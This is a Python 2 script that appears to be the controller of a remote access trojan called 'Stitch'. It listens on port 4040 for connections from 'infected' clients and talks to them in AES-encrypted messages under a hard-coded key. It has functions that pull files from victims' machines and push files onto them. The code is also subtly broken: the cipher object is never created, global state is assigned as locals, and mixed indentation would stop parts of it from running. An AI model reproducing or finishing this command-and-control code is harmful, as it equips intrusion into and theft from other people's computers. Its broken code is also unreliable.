#!/usr/bin/env python

from Crypto.Cipher import AES
import sys
import socket, base64, os, time, sys, select, threading

BLOCK_SIZE = 32

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

inf_sock = {}
inf_port = {}
inf_name = {}

# client information
active = False
clients = []
socks = []
interval = 0.8

listen_port = None
server_thread = None

HOST = ''
PORT = 4040

def run_server():
	client_socket=None
	server_running = True

	try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((HOST, PORT))
            server.listen(128)
            listen_port = PORT
        except Exception as e:
            server_thread='Failed'
            return
        server_thread = threading.currentThread()
        while True:
            if not server_running:
                break
            try:
                server.settimeout(2)
                client_socket, addr = server.accept()
            except Exception as e:
                pass
            if client_socket:
                inf_sock[addr[0]] = client_socket
                inf_port[addr[0]] = addr[1]
                client_socket = None
        server.close()
        for n in inf_sock: inf_sock[n].close()
        inf_sock={}
        inf_port={}
        listen_port=None
        server_thread=None

def stop_server():
        server_running = False

# send data
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))

# receive data
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data += decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# download file
def download(sock, remote_filename, local_filename=None):
	# check if file exists
	if not local_filename:
		local_filename = remote_filename
	try:
		f = open(local_filename, 'wb')
	except IOError:
		print "Error opening file.\n"
		Send(sock, "cd .")
		return
	# start transfer
	Send(sock, "download "+remote_filename)
	print "Downloading: " + remote_filename + " > " + local_filename
	fileData = Receive(sock)
	f.write(fileData)
	time.sleep(interval)
	f.close()
	time.sleep(interval)

# upload file
def upload(sock, local_filename, remote_filename=None):
	# check if file exists
	if not remote_filename:
		remote_filename = local_filename
	try:
		g = open(local_filename, 'rb')
	except IOError:
		print "Error opening file.\n"
		Send(sock, "cd .")
		return
	# start transfer
	Send(sock, "upload "+remote_filename)
	print 'Uploading: ' + local_filename + " > " + remote_filename
	while True:
		fileData = g.read()
		if not fileData: break
		Send(sock, fileData, "")
	g.close()
	time.sleep(interval)
	Send(sock, "")
	time.sleep(interval)
	
# refresh clients
def refresh():
	clear()
	print '\nListening for clients...\n'
	if len(clients) > 0:
		for j in range(0,len(clients)):
			print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
	else:
		print "...\n"
	# print exit option
	print "---\n"
	print "[0] Exit \n"
	print "\nPress Ctrl+C to interact with client."


def server_main():
    try:
        run_server()
    except KeyboardInterrupt:
        print"Exiting Stitch due to a KeyboardInterrupt"
	sys.exit()
    except Exception as e:
        print("Exiting Stitch due to an exception:\n{}".format(str(e)))
        print("[!] {}\n".format(str(e)))
       	sys.exit()


if __name__ == "__main__":
    server_main()
